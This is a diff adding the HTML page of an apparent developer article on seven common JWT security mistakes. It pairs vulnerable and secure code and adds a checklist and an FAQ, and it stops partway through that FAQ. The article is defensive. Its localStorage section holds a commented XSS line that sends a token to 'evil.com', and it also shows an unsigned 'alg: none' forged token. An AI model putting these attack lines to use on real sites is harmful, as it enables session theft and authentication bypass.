@@ -1,0 +1,748 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<link rel="icon" type="image/svg+xml" href="/favicon.svg">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>JWT Usage Patterns: Common Mistakes Developers Make | KappaKit Research</title>
+<meta name="description" content="Analysis of common JWT anti-patterns based on 18,477 Stack Overflow questions and 407.8M monthly npm downloads. Covers algorithm confusion, missing expiration, payload leaks, and best practices with code examples.">
+<meta name="keywords" content="jwt security, jwt best practices, jwt common mistakes, jwt algorithm confusion, jwt token security, jsonwebtoken vs jose, jwt expiration, jwt vulnerabilities, jwt anti-patterns">
+<link rel="canonical" href="https://kappakit.com/research/jwt-security-practices.html">
+<link rel="alternate" hreflang="en" href="https://kappakit.com/research/jwt-security-practices.html">
+<link rel="alternate" hreflang="x-default" href="https://kappakit.com/research/jwt-security-practices.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JWT Usage Patterns: Common Mistakes Developers Make">
+<meta property="og:description" content="Analysis of common JWT anti-patterns based on 18K+ Stack Overflow questions and 407.8M monthly npm downloads. Algorithm confusion, missing expiration, payload leaks, and fixes.">
+<meta property="og:url" content="https://kappakit.com/research/jwt-security-practices.html">
+<meta property="og:site_name" content="KappaKit">
+<meta property="og:image" content="https://kappakit.com/assets/og-image.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="JWT Usage Patterns: Common Mistakes Developers Make">
+<meta name="twitter:description" content="Analysis of common JWT anti-patterns based on 18K+ Stack Overflow questions and 407.8M monthly npm downloads.">
+<meta name="twitter:image" content="https://kappakit.com/assets/og-image.png">
+<link rel="stylesheet" href="/assets/style.css">
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "Article",
+  "headline": "JWT Usage Patterns: Common Mistakes Developers Make",
+  "description": "Analysis of common JWT anti-patterns based on 18,477 Stack Overflow questions and 407.8M monthly npm downloads. Covers algorithm confusion attacks, missing token expiration, storing sensitive data in payloads, and best practices with code examples.",
+  "author": {
+    "@type": "Person",
+    "name": "Michael Lip",
+    "url": "https://zovo.one"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "KappaKit",
+    "url": "https://kappakit.com"
+  },
+  "datePublished": "2026-04-07",
+  "dateModified": "2026-04-07",
+  "mainEntityOfPage": "https://kappakit.com/research/jwt-security-practices.html",
+  "image": "https://kappakit.com/assets/og-image.png"
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "FAQPage",
+  "mainEntity": [
+    {
+      "@type": "Question",
+      "name": "What is the most common JWT security mistake?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "The most common JWT security mistake is not validating the algorithm (alg) field in the token header. This enables algorithm confusion attacks where an attacker changes alg from RS256 to HS256, causing the server to use the public key as an HMAC secret — bypassing signature verification entirely. Always specify allowed algorithms explicitly when verifying tokens."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Should I use jsonwebtoken or jose in 2026?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "jose is the recommended choice in 2026. It accounts for 61% of JWT-related npm downloads (249.9M vs 157.9M for jsonwebtoken), uses native Web Crypto APIs for better performance and security, supports all modern runtimes (Node.js, Deno, Bun, browsers), and implements the full JOSE specification including JWE encryption. jsonwebtoken remains widely used but has a larger API surface and relies on older crypto primitives."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Is it safe to store sensitive data in a JWT payload?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "No. JWT payloads are Base64URL-encoded, not encrypted. Anyone with access to the token can decode the payload and read its contents. Never store passwords, credit card numbers, social security numbers, or other sensitive data in JWT claims. Use JWE (JSON Web Encryption) if the payload must be confidential, or store sensitive data server-side and reference it by ID in the JWT."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What is a good JWT expiration time?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Access tokens should expire in 5 to 15 minutes. Refresh tokens can have longer lifetimes (7 to 30 days) but should be stored securely (httpOnly cookies, not localStorage). Short-lived access tokens limit the damage window if a token is compromised. Implement token refresh flows to maintain user sessions without extending access token lifetimes."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "How do I revoke a JWT token?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "JWTs are stateless by design and cannot be revoked directly. Common revocation strategies include: short expiration times (limiting the window of validity), token blocklists (storing revoked token IDs server-side and checking on each request), refresh token rotation (issuing new refresh tokens on each use and invalidating the old one), and token versioning (incrementing a user-level version counter that invalidates all existing tokens)."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "Can I decode a JWT token without the secret key?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "Yes. The JWT header and payload are Base64URL-encoded, not encrypted. Anyone can decode them without any key. The signature (third segment) requires the secret key to verify, but reading the payload contents requires no authentication. This is why you should never store sensitive information in JWT claims. Tools like KappaKit's JWT Decoder can instantly parse any JWT token client-side."
+      }
+    },
+    {
+      "@type": "Question",
+      "name": "What JWT algorithms should I use?",
+      "acceptedAnswer": {
+        "@type": "Answer",
+        "text": "For symmetric signing (shared secret between issuer and verifier), use HS256 (HMAC-SHA256) with a secret of at least 256 bits. For asymmetric signing (separate public/private keys), use RS256 (RSA-SHA256) with at least 2048-bit keys, or ES256 (ECDSA with P-256) for smaller key sizes and faster verification. Avoid HS384/HS512 unless you have specific compliance requirements — they offer marginal security improvement over HS256 for most applications. Never use 'none' as an algorithm in production."
+      }
+    }
+  ]
+}
+</script>
+<style>
+.research-badge {
+  display: inline-block;
+  background: rgba(20, 184, 166, 0.12);
+  border: 1px solid var(--accent);
+  color: var(--accent);
+  font-size: 0.72rem;
+  font-weight: 600;
+  padding: 0.2rem 0.6rem;
+  border-radius: 3px;
+  letter-spacing: 0.05em;
+  text-transform: uppercase;
+  margin-bottom: 0.75rem;
+}
+.research-meta {
+  font-size: 0.82rem;
+  color: var(--text-muted);
+  margin-bottom: 2rem;
+  line-height: 1.6;
+}
+.research-meta a { color: var(--text-muted); }
+.research-meta a:hover { color: var(--accent); }
+.data-table {
+  width: 100%;
+  border-collapse: collapse;
+  margin: 1.5rem 0;
+  font-size: 0.85rem;
+}
+.data-table th {
+  text-align: left;
+  padding: 0.6rem 0.8rem;
+  border-bottom: 2px solid var(--accent);
+  font-family: var(--font-display);
+  font-size: 0.78rem;
+  color: var(--accent);
+  white-space: nowrap;
+}
+.data-table td {
+  padding: 0.6rem 0.8rem;
+  border-bottom: 1px solid var(--border);
+  vertical-align: top;
+}
+.data-table tr:hover td { background: var(--bg-hover); }
+.data-table .dl-num {
+  font-family: var(--font-display);
+  font-weight: 600;
+  white-space: nowrap;
+}
+.insight-box {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-left: 3px solid var(--accent);
+  border-radius: var(--radius);
+  padding: 1rem 1.25rem;
+  margin: 1.5rem 0;
+  font-size: 0.9rem;
+  line-height: 1.6;
+}
+.insight-box strong { color: var(--accent); }
+.danger-box {
+  background: rgba(239, 68, 68, 0.06);
+  border: 1px solid rgba(239, 68, 68, 0.3);
+  border-left: 3px solid #ef4444;
+  border-radius: var(--radius);
+  padding: 1rem 1.25rem;
+  margin: 1.5rem 0;
+  font-size: 0.9rem;
+  line-height: 1.6;
+}
+.danger-box strong { color: #ef4444; }
+.safe-box {
+  background: rgba(34, 197, 94, 0.06);
+  border: 1px solid rgba(34, 197, 94, 0.3);
+  border-left: 3px solid #22c55e;
+  border-radius: var(--radius);
+  padding: 1rem 1.25rem;
+  margin: 1.5rem 0;
+  font-size: 0.9rem;
+  line-height: 1.6;
+}
+.safe-box strong { color: #22c55e; }
+.code-block {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 1rem;
+  overflow-x: auto;
+  margin: 1rem 0;
+  font-family: var(--font-display);
+  font-size: 0.82rem;
+  line-height: 1.6;
+}
+.code-block .comment { color: var(--text-muted); }
+.code-block .keyword { color: #c792ea; }
+.code-block .string { color: #c3e88d; }
+.code-block .func { color: #82aaff; }
+.code-block .danger { color: #ef4444; }
+.code-label {
+  font-size: 0.72rem;
+  font-weight: 600;
+  text-transform: uppercase;
+  letter-spacing: 0.05em;
+  margin-bottom: 0.25rem;
+  display: block;
+}
+.code-label.bad { color: #ef4444; }
+.code-label.good { color: #22c55e; }
+.mistake-section {
+  margin: 2.5rem 0;
+  padding-top: 1.5rem;
+  border-top: 1px solid var(--border);
+}
+.mistake-section h3 {
+  color: var(--text);
+  margin-bottom: 0.75rem;
+}
+.methodology-section {
+  background: var(--bg-card);
+  border: 1px solid var(--border);
+  border-radius: var(--radius);
+  padding: 1.25rem 1.5rem;
+  margin: 2rem 0;
+  font-size: 0.85rem;
+  line-height: 1.6;
+}
+.methodology-section h3 {
+  font-size: 0.95rem;
+  margin-bottom: 0.75rem;
+}
+</style>
+</head>
+<body>
+<header class="site-header">
+  <a href="/" class="site-logo">KappaKit</a>
+  <nav class="site-nav">
+    <a href="/">Home</a>
+    <a href="/tools/">Tools</a>
+    <a href="/blog/">Blog</a>
+    <a href="/about.html">About</a>
+    <div class="nav-right">
+      <a href="https://zovo.one/pricing?utm_source=kappakit.com&amp;utm_medium=satellite&amp;utm_campaign=nav-link" class="nav-pro" target="_blank">Go Pro ✦</a>
+      <a href="https://zovo.one/tools" class="nav-zovo">Zovo Tools</a>
+    </div>
+  </nav>
+</header>
+
+<main>
+  <article class="article-content">
+    <nav class="breadcrumb" aria-label="Breadcrumb">
+      <a href="/">Home</a> <span>/</span> <a href="/research/developer-tool-usage-2026.html">Research</a> <span>/</span> <span>JWT Security Practices</span>
+    </nav>
+
+    <div class="research-badge">Original Research</div>
+    <h1>JWT Usage Patterns: Common Mistakes Developers Make</h1>
+    <div class="research-meta">
+      By <a href="/about.html">Michael Lip</a> &middot; Published April 7, 2026 &middot; Data source: npm registry API, Stack Overflow API &middot; Last updated: <time datetime="2026-04-07">April 7, 2026</time>
+    </div>
+
+    <p>JSON Web Tokens (JWTs) are the de facto standard for stateless authentication in web applications. With <strong>407.8 million monthly npm downloads</strong> across the jose and jsonwebtoken packages, and <strong>18,477 Stack Overflow questions</strong>, JWTs are both heavily adopted and frequently misunderstood.</p>
+
+    <p>The disproportionate ratio of Stack Overflow questions to download volume signals a fundamental problem: JWT is easy to use but hard to use <em>correctly</em>. This article catalogs the most common JWT anti-patterns, explains why they are dangerous, and provides secure alternatives with working code examples.</p>
+
+    <h2>The JWT Ecosystem in 2026</h2>
+
+    <p>Before diving into mistakes, here is where the JWT package ecosystem stands today:</p>
+
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Package</th>
+          <th>Monthly Downloads</th>
+          <th>Share</th>
+          <th>Key Characteristics</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td><strong>jose</strong></td>
+          <td class="dl-num">249.9M</td>
+          <td>61.3%</td>
+          <td>Full JOSE spec, Web Crypto API, multi-runtime (Node/Deno/Bun/browser)</td>
+        </tr>
+        <tr>
+          <td><strong>jsonwebtoken</strong></td>
+          <td class="dl-num">157.9M</td>
+          <td>38.7%</td>
+          <td>Node.js focused, callback-based API, depends on jws and jwa</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <div class="insight-box">
+      <strong>Trend:</strong> jose now accounts for 61% of JWT downloads, overtaking jsonwebtoken. This shift reflects the ecosystem's move toward standards-compliant implementations that use native Web Crypto APIs instead of OpenSSL bindings. If you are starting a new project, jose is the recommended choice.
+    </div>
+
+    <h2>The Seven Most Common JWT Mistakes</h2>
+
+    <div class="mistake-section">
+      <h3>Mistake 1: Not Validating the Algorithm</h3>
+
+      <p>The <strong>algorithm confusion attack</strong> is the most dangerous JWT vulnerability. It exploits servers that read the <code>alg</code> field from the token header instead of enforcing an expected algorithm.</p>
+
+      <p><strong>How it works:</strong> If a server uses RS256 (asymmetric), the verification process uses the RSA public key. An attacker modifies the token header to <code>"alg": "HS256"</code> (symmetric) and signs the token using the public key as the HMAC secret. Since the public key is often publicly available, the server unknowingly verifies the forged token using the same public key as an HMAC secret, and the signature matches.</p>
+
+      <span class="code-label bad">Vulnerable code</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: Trusting the alg claim from the token</span>
+<span class="keyword">const</span> decoded = jwt.<span class="func">verify</span>(token, publicKey); <span class="comment">// No algorithm restriction!</span>
+      </div>
+
+      <span class="code-label good">Secure code</span>
+      <div class="code-block">
+<span class="comment">// SAFE: Explicitly specifying allowed algorithms</span>
+<span class="keyword">const</span> decoded = jwt.<span class="func">verify</span>(token, publicKey, {
+  algorithms: [<span class="string">'RS256'</span>]  <span class="comment">// Only accept RS256</span>
+});
+
+<span class="comment">// With jose (recommended):</span>
+<span class="keyword">import</span> { <span class="func">jwtVerify</span> } <span class="keyword">from</span> <span class="string">'jose'</span>;
+<span class="keyword">const</span> { payload } = <span class="keyword">await</span> <span class="func">jwtVerify</span>(token, publicKey, {
+  algorithms: [<span class="string">'RS256'</span>]
+});
+      </div>
+
+      <div class="danger-box">
+        <strong>Impact:</strong> Complete authentication bypass. An attacker can forge tokens for any user without knowing the private key. This vulnerability has been assigned CVE-2015-9235 and affects all JWT libraries that do not enforce algorithm validation.
+      </div>
+    </div>
+
+    <div class="mistake-section">
+      <h3>Mistake 2: No Token Expiration</h3>
+
+      <p>Tokens without an <code>exp</code> (expiration) claim are valid forever. If a token is leaked, stolen, or intercepted, it provides permanent access to the system.</p>
+
+      <span class="code-label bad">No expiration</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: Token never expires</span>
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>({
+  sub: user.id,
+  role: <span class="string">'admin'</span>
+}, secret);
+      </div>
+
+      <span class="code-label good">With expiration</span>
+      <div class="code-block">
+<span class="comment">// SAFE: Short-lived access token + refresh flow</span>
+<span class="keyword">const</span> accessToken = jwt.<span class="func">sign</span>({
+  sub: user.id,
+  role: <span class="string">'admin'</span>
+}, secret, {
+  expiresIn: <span class="string">'15m'</span>  <span class="comment">// 15-minute access token</span>
+});
+
+<span class="keyword">const</span> refreshToken = jwt.<span class="func">sign</span>({
+  sub: user.id,
+  type: <span class="string">'refresh'</span>
+}, refreshSecret, {
+  expiresIn: <span class="string">'7d'</span>  <span class="comment">// 7-day refresh token</span>
+});
+
+<span class="comment">// With jose:</span>
+<span class="keyword">import</span> { <span class="func">SignJWT</span> } <span class="keyword">from</span> <span class="string">'jose'</span>;
+<span class="keyword">const</span> token = <span class="keyword">await new</span> <span class="func">SignJWT</span>({ sub: user.id, role: <span class="string">'admin'</span> })
+  .<span class="func">setProtectedHeader</span>({ alg: <span class="string">'HS256'</span> })
+  .<span class="func">setExpirationTime</span>(<span class="string">'15m'</span>)
+  .<span class="func">setIssuedAt</span>()
+  .<span class="func">sign</span>(secret);
+      </div>
+
+      <div class="safe-box">
+        <strong>Best practice:</strong> Access tokens: 5-15 minutes. Refresh tokens: 7-30 days. Implement token rotation where each refresh token use issues a new refresh token and invalidates the previous one.
+      </div>
+    </div>
+
+    <div class="mistake-section">
+      <h3>Mistake 3: Storing Sensitive Data in the Payload</h3>
+
+      <p>JWT payloads are Base64URL-encoded, <strong>not encrypted</strong>. Anyone with access to the token can decode the payload and read every claim. You can verify this yourself &mdash; paste any JWT into KappaKit's <a href="/">JWT Decoder</a> and the payload is instantly readable.</p>
+
+      <span class="code-label bad">Sensitive data in payload</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: Readable by anyone who intercepts the token</span>
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>({
+  sub: user.id,
+  <span class="danger">email: 'user@example.com',</span>
+  <span class="danger">ssn: '123-45-6789',</span>
+  <span class="danger">creditCard: '4111-1111-1111-1111',</span>
+  <span class="danger">internalRole: 'super_admin'</span>
+}, secret);
+      </div>
+
+      <span class="code-label good">Minimal payload</span>
+      <div class="code-block">
+<span class="comment">// SAFE: Only include identifiers, not sensitive data</span>
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>({
+  sub: user.id,         <span class="comment">// Opaque user identifier</span>
+  role: <span class="string">'user'</span>,         <span class="comment">// Authorization level (non-sensitive)</span>
+  iss: <span class="string">'api.myapp.com'</span>, <span class="comment">// Issuer</span>
+  aud: <span class="string">'myapp.com'</span>      <span class="comment">// Audience</span>
+}, secret, { expiresIn: <span class="string">'15m'</span> });
+
+<span class="comment">// Look up sensitive data server-side using the sub claim</span>
+<span class="keyword">const</span> user = <span class="keyword">await</span> db.<span class="func">findById</span>(decoded.sub);
+      </div>
+
+      <p>If you must transmit confidential data in a token, use JWE (JSON Web Encryption) instead of JWS (JSON Web Signing). The jose library supports both:</p>
+
+      <div class="code-block">
+<span class="comment">// JWE: Encrypted token - payload is not readable without the key</span>
+<span class="keyword">import</span> { <span class="func">EncryptJWT</span> } <span class="keyword">from</span> <span class="string">'jose'</span>;
+<span class="keyword">const</span> token = <span class="keyword">await new</span> <span class="func">EncryptJWT</span>({ email: <span class="string">'user@example.com'</span> })
+  .<span class="func">setProtectedHeader</span>({ alg: <span class="string">'RSA-OAEP'</span>, enc: <span class="string">'A256GCM'</span> })
+  .<span class="func">setExpirationTime</span>(<span class="string">'15m'</span>)
+  .<span class="func">encrypt</span>(publicKey);
+      </div>
+    </div>
+
+    <div class="mistake-section">
+      <h3>Mistake 4: Using Weak Signing Secrets</h3>
+
+      <p>HMAC-based JWT algorithms (HS256, HS384, HS512) derive their security from the secret key. A short or predictable secret can be brute-forced, allowing an attacker to forge valid tokens.</p>
+
+      <span class="code-label bad">Weak secrets</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: These secrets can be brute-forced in seconds</span>
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>(payload, <span class="danger">'secret'</span>);
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>(payload, <span class="danger">'password123'</span>);
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>(payload, <span class="danger">'my-jwt-secret'</span>);
+<span class="keyword">const</span> token = jwt.<span class="func">sign</span>(payload, <span class="danger">process.env.APP_NAME</span>);
+      </div>
+
+      <span class="code-label good">Strong secrets</span>
+      <div class="code-block">
+<span class="comment">// SAFE: Generate a cryptographically random 256-bit secret</span>
+<span class="comment">// Run once and store in your secrets manager:</span>
+<span class="comment">// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"</span>
+
+<span class="keyword">const</span> secret = <span class="keyword">new</span> <span class="func">TextEncoder</span>().<span class="func">encode</span>(process.env.JWT_SECRET);
+<span class="comment">// JWT_SECRET should be at least 64 hex characters (256 bits)</span>
+
+<span class="comment">// Or use jose with KeyLike objects:</span>
+<span class="keyword">import</span> { <span class="func">generateSecret</span> } <span class="keyword">from</span> <span class="string">'jose'</span>;
+<span class="keyword">const</span> secret = <span class="keyword">await</span> <span class="func">generateSecret</span>(<span class="string">'HS256'</span>);
+      </div>
+
+      <p>For HS256, the secret must be at least 256 bits (32 bytes). For RS256, use RSA keys of at least 2048 bits. For ES256, use P-256 (secp256r1) curve keys.</p>
+    </div>
+
+    <div class="mistake-section">
+      <h3>Mistake 5: Storing JWTs in localStorage</h3>
+
+      <p>localStorage is accessible to any JavaScript running on the page, including third-party scripts and XSS payloads. Storing JWTs in localStorage exposes them to cross-site scripting attacks.</p>
+
+      <span class="code-label bad">localStorage storage</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: Any XSS vulnerability exposes the token</span>
+localStorage.<span class="func">setItem</span>(<span class="string">'token'</span>, jwt);
+
+<span class="comment">// An XSS payload can steal it:</span>
+<span class="comment">// fetch('https://evil.com/steal?t=' + localStorage.getItem('token'))</span>
+      </div>
+
+      <span class="code-label good">httpOnly cookie storage</span>
+      <div class="code-block">
+<span class="comment">// SAFE: httpOnly cookies are inaccessible to JavaScript</span>
+res.<span class="func">cookie</span>(<span class="string">'token'</span>, jwt, {
+  httpOnly: <span class="keyword">true</span>,   <span class="comment">// Cannot be read by JavaScript</span>
+  secure: <span class="keyword">true</span>,     <span class="comment">// HTTPS only</span>
+  sameSite: <span class="string">'Strict'</span>, <span class="comment">// Blocks CSRF from cross-origin</span>
+  maxAge: 15 * 60 * 1000, <span class="comment">// 15 minutes</span>
+  path: <span class="string">'/'</span>
+});
+      </div>
+
+      <p>httpOnly cookies cannot be accessed by JavaScript. Combined with <code>Secure</code> (HTTPS-only) and <code>SameSite=Strict</code> (blocks cross-origin requests), this provides defense in depth against both XSS and CSRF attacks.</p>
+    </div>
+
+    <div class="mistake-section">
+      <h3>Mistake 6: Not Validating Issuer and Audience</h3>
+
+      <p>A JWT signed by one service can be replayed against another service if both use the same signing key. Without <code>iss</code> (issuer) and <code>aud</code> (audience) validation, a token meant for your staging environment could be used in production, or a token from a microservice could be replayed against a different one.</p>
+
+      <span class="code-label bad">No issuer/audience check</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: Accepts tokens from any issuer</span>
+<span class="keyword">const</span> decoded = jwt.<span class="func">verify</span>(token, secret);
+      </div>
+
+      <span class="code-label good">With issuer and audience validation</span>
+      <div class="code-block">
+<span class="comment">// SAFE: Verify issuer and audience claims</span>
+<span class="keyword">const</span> decoded = jwt.<span class="func">verify</span>(token, secret, {
+  algorithms: [<span class="string">'HS256'</span>],
+  issuer: <span class="string">'api.myapp.com'</span>,
+  audience: <span class="string">'myapp.com'</span>
+});
+
+<span class="comment">// With jose:</span>
+<span class="keyword">const</span> { payload } = <span class="keyword">await</span> <span class="func">jwtVerify</span>(token, secret, {
+  algorithms: [<span class="string">'HS256'</span>],
+  issuer: <span class="string">'api.myapp.com'</span>,
+  audience: <span class="string">'myapp.com'</span>
+});
+      </div>
+    </div>
+
+    <div class="mistake-section">
+      <h3>Mistake 7: Using the "none" Algorithm in Production</h3>
+
+      <p>The JWT specification includes an <code>"alg": "none"</code> option for unsigned tokens. Some JWT libraries accept <code>none</code> by default, allowing attackers to remove the signature entirely and have the token accepted as valid.</p>
+
+      <span class="code-label bad">Accepting "none" algorithm</span>
+      <div class="code-block">
+<span class="comment">// DANGEROUS: Attacker crafts a token with alg: "none" and no signature</span>
+<span class="comment">// eyJhbGciOiJub25lIn0.eyJzdWIiOiIxMjM0NTY3ODkwIiwiYWRtaW4iOnRydWV9.</span>
+<span class="keyword">const</span> decoded = jwt.<span class="func">decode</span>(token); <span class="comment">// decode() doesn't verify!</span>
+      </div>
+
+      <span class="code-label good">Enforcing algorithm verification</span>
+      <div class="code-block">
+<span class="comment">// SAFE: Always use verify(), never decode(), for authentication</span>
+<span class="keyword">const</span> decoded = jwt.<span class="func">verify</span>(token, secret, {
+  algorithms: [<span class="string">'HS256'</span>]  <span class="comment">// 'none' is not in the list</span>
+});
+      </div>
+
+      <div class="danger-box">
+        <strong>Critical distinction:</strong> <code>jwt.decode()</code> parses the token without verifying the signature. It should only be used for inspecting token contents (debugging), never for authentication decisions. Always use <code>jwt.verify()</code> with explicit algorithm restrictions for any security-relevant token validation.
+      </div>
+    </div>
+
+    <h2>JWT Security Checklist</h2>
+
+    <p>Use this checklist to audit your JWT implementation:</p>
+
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Check</th>
+          <th>Action</th>
+          <th>Risk if Missing</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Algorithm enforcement</td>
+          <td>Pass <code>algorithms</code> array to <code>verify()</code></td>
+          <td>Complete authentication bypass</td>
+        </tr>
+        <tr>
+          <td>Token expiration</td>
+          <td>Set <code>exp</code> claim (5-15 min for access tokens)</td>
+          <td>Permanent access from stolen tokens</td>
+        </tr>
+        <tr>
+          <td>Payload minimization</td>
+          <td>Only include identifiers, not sensitive data</td>
+          <td>Data leakage from intercepted tokens</td>
+        </tr>
+        <tr>
+          <td>Strong secret</td>
+          <td>256+ bit random secret for HMAC; 2048+ bit RSA keys</td>
+          <td>Token forgery via brute force</td>
+        </tr>
+        <tr>
+          <td>Secure storage</td>
+          <td>httpOnly + Secure + SameSite cookies</td>
+          <td>Token theft via XSS</td>
+        </tr>
+        <tr>
+          <td>Issuer validation</td>
+          <td>Verify <code>iss</code> claim against expected value</td>
+          <td>Cross-service token replay</td>
+        </tr>
+        <tr>
+          <td>Audience validation</td>
+          <td>Verify <code>aud</code> claim against expected value</td>
+          <td>Cross-environment token replay</td>
+        </tr>
+        <tr>
+          <td>Reject "none" algorithm</td>
+          <td>Explicitly list allowed algorithms</td>
+          <td>Unsigned token acceptance</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <h2>jsonwebtoken vs. jose: Migration Guide</h2>
+
+    <p>If you are still using jsonwebtoken (38.7% of the market), here is how the two libraries compare for common operations:</p>
+
+    <table class="data-table">
+      <thead>
+        <tr>
+          <th>Operation</th>
+          <th>jsonwebtoken</th>
+          <th>jose</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td>Sign</td>
+          <td><code>jwt.sign(payload, secret, opts)</code></td>
+          <td><code>new SignJWT(payload).setProtectedHeader({alg}).sign(key)</code></td>
+        </tr>
+        <tr>
+          <td>Verify</td>
+          <td><code>jwt.verify(token, key, opts)</code></td>
+          <td><code>jwtVerify(token, key, opts)</code></td>
+        </tr>
+        <tr>
+          <td>Decode (no verify)</td>
+          <td><code>jwt.decode(token)</code></td>
+          <td><code>decodeJwt(token)</code></td>
+        </tr>
+        <tr>
+          <td>Async</td>
+          <td>Callback-based</td>
+          <td>Promise-based (async/await)</td>
+        </tr>
+        <tr>
+          <td>Crypto backend</td>
+          <td>Node.js crypto (OpenSSL)</td>
+          <td>Web Crypto API (native)</td>
+        </tr>
+        <tr>
+          <td>Runtime support</td>
+          <td>Node.js only</td>
+          <td>Node.js, Deno, Bun, browsers</td>
+        </tr>
+        <tr>
+          <td>JWE (encryption)</td>
+          <td>Not supported</td>
+          <td>Full support</td>
+        </tr>
+      </tbody>
+    </table>
+
+    <p>To inspect tokens during development and debugging, use KappaKit's <a href="/">JWT Decoder</a>. It runs entirely in your browser and never transmits your token to any server &mdash; critical when debugging production tokens that may contain real user data.</p>
+
+    <h2>Key Takeaways</h2>
+
+    <ol>
+      <li><strong>Always specify allowed algorithms.</strong> The algorithm confusion attack is the single most dangerous JWT vulnerability, and it is trivially preventable with one configuration option.</li>
+      <li><strong>Set short expiration times.</strong> 15-minute access tokens with 7-day refresh tokens provide a good balance between security and user experience.</li>
+      <li><strong>Never store sensitive data in JWT payloads.</strong> The payload is Base64URL-encoded, not encrypted. Anyone can read it.</li>
+      <li><strong>Use httpOnly cookies, not localStorage.</strong> httpOnly cookies are immune to XSS attacks; localStorage is not.</li>
+      <li><strong>Migrate from jsonwebtoken to jose.</strong> jose uses native Web Crypto, supports all modern runtimes, and implements the full JOSE specification including encryption.</li>
+      <li><strong>Validate issuer and audience.</strong> These claims prevent cross-service and cross-environment token replay attacks.</li>
+    </ol>
+
+    <div class="methodology-section">
+      <h3>Methodology &amp; Sources</h3>
+      <p><strong>Download data:</strong> npm registry API (<code>api.npmjs.org/downloads/point/last-month</code>), collected April 7, 2026.</p>
+      <p><strong>Stack Overflow data:</strong> Stack Exchange API v2.3 (<code>api.stackexchange.com/2.3/tags/jwt/info</code>), collected April 7, 2026. The 18,477 figure represents cumulative questions tagged with "jwt" on Stack Overflow.</p>
+      <p><strong>Vulnerability references:</strong> Algorithm confusion (CVE-2015-9235), "none" algorithm bypass (RFC 7518 Section 3.6), and localStorage XSS vectors are well-documented in OWASP JWT Security Cheat Sheet and the Auth0 JWT Handbook.</p>
+      <p><strong>Code examples:</strong> All code samples use the jsonwebtoken (v9.x) and jose (v5.x) APIs current as of April 2026. Test all security-critical code in your specific environment before deploying.</p>
+    </div>
+
+    <section class="faq-section" style="max-width:720px;margin:2rem auto;">
+      <h2>Frequently Asked Questions</h2>
+
+      <details>
+        <summary>What is the most common JWT security mistake?</summary>
+        <p>The most common JWT security mistake is not validating the algorithm (alg) field in the token header. This enables algorithm confusion attacks where an attacker changes alg from RS256 to HS256, causing the server to use the public key as an HMAC secret and bypassing signature verification entirely. Always specify allowed algorithms explicitly.</p>
+      </details>
+
+      <details>
+        <summary>Should I use jsonwebtoken or jose in 2026?</summary>
+        <p>jose is the recommended choice. It accounts for 61% of JWT downloads (249.9M/month), uses native Web Crypto APIs, supports all modern runtimes (Node.js, Deno, Bun, browsers), and implements the full JOSE specification including JWE encryption. jsonwebtoken is Node.js-only and uses older crypto primitives.</p>
+      </details>
+
+      <details>
+        <summary>Is it safe to store sensitive data in a JWT payload?</summary>
+        <p>No. JWT payloads are Base64URL-encoded, not encrypted. Anyone with access to the token can decode the payload and read its contents. Never store passwords, credit card numbers, or other sensitive data in JWT claims. Use JWE for encrypted payloads or store sensitive data server-side.</p>
+      </details>
+
+      <details>
+        <summary>What is a good JWT expiration time?</summary>
+        <p>Access tokens should expire in 5 to 15 minutes. Refresh tokens can last 7 to 30 days but should be stored securely in httpOnly cookies, not localStorage. Short-lived access tokens limit the damage window if a token is compromised.</p>
+      </details>
+
+      <details>
+        <summary>How do I revoke a JWT token?</summary>
+        <p>JWTs are stateless and cannot be revoked directly. Common strategies include: short expiration times, server-side token blocklists, refresh token rotation (issuing new tokens on each use), and token versioning (incrementing a per-user version counter).</p>
+      </details>
+
+      <details>
+        <summary>Can I decode a JWT without the secret key?</summary>
+        <p>Yes. The header and payload are Base64URL-encoded, not encrypted. Anyone can decode them. The signature requires the secret key to verify, but reading the contents requires no key. This is why sensitive data should never be stored in JWT claims.</p>
+      </details>
+
+      <details>
+        <summary>What JWT algorithms should I use?</summary>
